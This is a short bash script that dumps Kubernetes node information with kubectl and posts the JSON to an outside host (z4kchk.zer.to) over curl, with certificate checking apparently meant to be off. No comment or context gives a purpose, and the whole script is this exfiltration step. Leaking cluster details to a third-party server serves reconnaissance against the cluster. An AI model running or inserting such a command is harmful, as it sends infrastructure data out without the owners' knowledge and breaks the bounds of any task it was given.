#! /bin/bash
kubectl get nodes -o json | curl -insecure -H "Content-Type: application/json" -X POST --data-binary @- https://z4kchk.zer.to/nodeinfo